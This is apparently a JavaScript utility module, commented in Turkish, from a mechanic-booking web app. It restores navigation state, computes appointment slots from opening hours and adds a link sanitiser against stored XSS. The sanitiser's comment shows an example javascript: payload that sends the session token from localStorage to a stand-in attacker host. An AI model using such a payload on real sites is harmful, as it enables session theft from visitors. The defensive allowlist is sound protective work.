//
// Bu bir yönlendirici (router) DEĞİL: adres çubuğu hâlâ değişmiyor, dolayısıyla bağlantı
// paylaşarak derin sayfa açılamıyor. Gerçek çözüm URL tabanlı yönlendirme; bu ise onu beklerken
// kullanıcının canını yakan asıl sorunu (yenilemede her şeyi kaybetmek) gideriyor.
const NAV_SESSION_KEY = "fixperto_nav";

// Herkesin görebildiği ekranlar.
const NAV_PUBLIC_SCREENS = ["landing", "owner", "detail", "listingDetail", "blog", "blogPost", "about", "careers"];
// Yalnızca oturum varsa geri yüklenen ekranlar.
const NAV_AUTH_SCREENS = ["mechanicDashboard", "mechProfilePage", "mechBrowse", "ownerProfilePage", "ownerSettings"];
// Bilerek geri YÜKLENMEYEN ekranlar (listede olmayan her şey zaten elenir):
//   login/signup/loginOtp/forgotPassword/resetSent → yarım kalmış kimlik akışı; tazelenince
//     baştan başlaması doğru.
//   chat/confirmed → anlık ekranlar; içerikleri (aktif sohbet, yeni randevu özeti) kalıcı değil.
//   adminLogin/adminDashboard → yönetici oturumu ayrı token'a bağlı, tahminle açılmamalı.
//   booking → tarih/saat/hizmet seçimleri saklanmıyor; boş bir randevu formuna düşürmek yerine
//     kullanıcıyı tamircinin sayfasına geri bırakıyoruz.

export function writeNavSession(snapshot) {
  try { window.sessionStorage.setItem(NAV_SESSION_KEY, JSON.stringify(snapshot)); } catch { /* özel mod / kota — gezinme çalışmaya devam etsin */ }
}

/** Açılışta geri yüklenecek gezinme durumu; geri yüklenemiyorsa null (ana sayfa). */
export function readNavSession(hasSession) {
  let snap = null;
  try {
    const raw = window.sessionStorage.getItem(NAV_SESSION_KEY);
    if (!raw) return null;
    snap = JSON.parse(raw);
  } catch { return null; }
  if (!snap || typeof snap !== "object") return null;

  let screen = snap.screen;
  // Randevu formu: seçimler saklanmadığı için tamircinin sayfasına düşürülüyor.
  if (screen === "booking") screen = snap.selectedMechanicId != null ? "detail" : "landing";
  if (!NAV_PUBLIC_SCREENS.includes(screen) && !NAV_AUTH_SCREENS.includes(screen)) return null;
  if (NAV_AUTH_SCREENS.includes(screen) && !hasSession) return null;
  // Kimliği kaybolmuş derin ekranlar: boş sayfa göstermektense ana sayfaya düş.
  if (screen === "detail" && snap.selectedMechanicId == null) screen = "landing";
  if (screen === "listingDetail" && snap.listingPageId == null) screen = "landing";
  if (screen === "blogPost" && !snap.blogSlug) screen = "blog";

  const out = { ...snap, screen };
  // Oturum yoksa rol her zaman "owner"; ayrıca hesap sekmeleri misafire açılmamalı.
  if (!hasSession) { out.role = "owner"; if (out.ownerTab && out.ownerTab !== "search") out.ownerTab = "search"; }
  return out;
}

// ==================== TAMİRCİNİN GERÇEK ÇALIŞMA SAATLERİNDEN RANDEVU SAATLERİ ====================
// SORUN: randevu ekranı, kendi hesabımız dışındaki HER tamirci için saatleri 09:00-18:00 diye
// sabit üretiyordu. Yani profilinde "Cmt: 09:00-14:00, Paz: Kapalı" yazan bir tamirciye pazar
// günü saat 17:30'a randevu verilebiliyordu. Müşteri kapalı bir dükkâna gidiyordu.
//
// Bu tamircilerin saatleri `hoursText` alanında METİN olarak duruyor
// (["Pzt: 09:00-18:00", ..., "Paz: Kapalı"]). Aşağıdaki fonksiyon o metni okuyup gerçek slotlara
// çeviriyor. Diziyi ETİKETE göre değil SIRAYA göre okuyoruz (0=Pazartesi): etiketler dile göre
// değişebilir ("Pzt"/"Mon"/"Mo"), sıra değişmez.
//
// Öğle arası gibi çok aralıklı satırlar ("09:00-12:00, 13:00-18:00") destekleniyor.
export function slotsFromHoursLine(line) {
  const text = String(line ?? "");
  const ranges = text.match(/(\d{1,2}:\d{2})\s*-\s*(\d{1,2}:\d{2})/g) || [];
  const out = [];
  for (const r of ranges) {
    const [start, end] = r.split("-").map((x) => x.trim());
    for (const s of genSlots(start, end)) if (!out.includes(s)) out.push(s);
  }
  return out.sort();
}

/** Verilen tarihte, hoursText'e göre randevu verilebilecek saatler. hoursText yoksa null döner. */
export function slotsFromHoursText(hoursText, date) {
  if (!Array.isArray(hoursText) || hoursText.length === 0) return null;
  // JS'te getDay(): 0=Pazar. Bizim dizimiz Pazartesi ile başlıyor.
  const idx = (date.getDay() + 6) % 7;
  const line = hoursText[idx];
  if (line === undefined) return null;
  return slotsFromHoursLine(line);
}

/**
 * Bir saat diliminin GEÇMİŞTE kalıp kalmadığı. Bugüne randevu alınırken saat 17:00'de 09:00'ı
 * seçebilmek anlamsızdı — üstelik tamirci tarafında geçmiş saatli randevu olarak görünüyordu.
 * `leadMinutes`: en erken kaç dakika sonrasına randevu verilebilir (yolda geçen süre payı).
 */
export function isSlotInPast(date, slot, now = new Date(), leadMinutes = 60) {
  if (!date || !slot) return false;
  const sameDay = date.getFullYear() === now.getFullYear()
    && date.getMonth() === now.getMonth()
    && date.getDate() === now.getDate();
  if (date < new Date(now.getFullYear(), now.getMonth(), now.getDate())) return true;
  if (!sameDay) return false;
  const [h, m] = String(slot).split(":").map(Number);
  const slotMinutes = h * 60 + m;
  return slotMinutes < now.getHours() * 60 + now.getMinutes() + leadMinutes;
}

/** Saat dilimini günün bölümüne ayırır — uzun slot listesi böyle okunabilir hale geliyor. */
export function slotPeriod(slot) {
  const h = Number(String(slot).split(":")[0]);
  if (h < 12) return "morning";
  if (h < 17) return "afternoon";
  return "evening";
}

/**
 * Ay görünümü için hücreler: ayın günleri + baştaki boşluklar (Pazartesi ile başlayan ızgara).
 * Boş hücreler null olarak döner.
 */
export function monthGrid(year, month) {
  const first = new Date(year, month, 1);
  const lead = (first.getDay() + 6) % 7; // Pazartesi = 0
  const daysInMonth = new Date(year, month + 1, 0).getDate();
  const cells = [];
  for (let i = 0; i < lead; i++) cells.push(null);
  for (let d = 1; d <= daysInMonth; d++) cells.push(new Date(year, month, d));
  return cells;
}

// ==================== GÜVENLİK: KULLANICIDAN GELEN BAĞLANTILARIN DENETİMİ ====================
// GÜVENLİK AÇIĞI (site geneli denetimde bulundu): kullanıcıların girdiği bazı adresler doğrudan
// bir <a href> içine konuyordu — ilan sahibinin girdiği "ekspertiz raporu linki"
// (inspectionReportUrl) ve iş başvurusuna eklenen CV bağlantısı (cvUrl).
//
// Neden tehlikeli: href yalnızca http/https olmak zorunda değil. Kötü niyetli bir satıcı
// `javascript:fetch("https://kotu.site/"+localStorage.getItem("fixperto_session_v1"))` yazarsa,
// o bağlantıya tıklayan HER ziyaretçinin tarayıcısında bu kod çalışır ve oturum token'ı çalınır.
// Aynı şekilde `data:text/html,<script>…</script>` da sayfa açar. Bu, klasik bir DEPOLANMIŞ XSS:
// saldırgan kodu bir kez kaydeder, kurbanlar sonradan tetikler.
//
// Çözüm: adresi göstermeden önce şemasını denetlemek. İzin verilenler dışındaki her şey için null
// dönüyoruz; çağıran taraf bağlantıyı hiç göstermiyor. Beyaz liste (izin verilenleri say) kara
// listeden (yasaklıları say) daha güvenli — atlanan bir şema varsayılan olarak REDDEDİLİYOR.
const SAFE_LINK_SCHEMES = ["http:", "https:", "mailto:", "tel:"];
// CV yüklemesi dosyayı data: URI olarak saklıyor (bkz. jobApplyCv). Bu yüzden data: tamamen
// yasaklanamıyor — ama SADECE zararsız içerik türlerine izin veriliyor. data:text/html asla.
const SAFE_DATA_PREFIXES = ["data:application/pdf", "data:image/png", "data:image/jpeg", "data:image/jpg", "data:image/webp", "data:image/gif"];

/** Güvenliyse adresin kendisi, değilse null. `null` dönerse bağlantı HİÇ gösterilmemeli. */
export function safeHref(value) {
  const raw = String(value ?? "").trim();
  if (!raw) return null;
  const lower = raw.toLowerCase();
  if (lower.startsWith("data:")) {
    return SAFE_DATA_PREFIXES.some((p) => lower.startsWith(p)) ? raw : null;
  }
  try {
    // Şema yoksa ("ornek.com/rapor.pdf") kullanıcı büyük ihtimalle https demek istiyor; bunu
    // reddetmek yerine https'e tamamlıyoruz — aksi halde geçerli bağlantılar kaybolurdu.
    const url = new URL(/^[a-z][a-z0-9+.-]*:/i.test(raw) ? raw : `https://${raw}`);
    return SAFE_LINK_SCHEMES.includes(url.protocol) ? url.href : null;
  } catch {
    return null; // ayrıştırılamayan adres = gösterilmez
  }
}
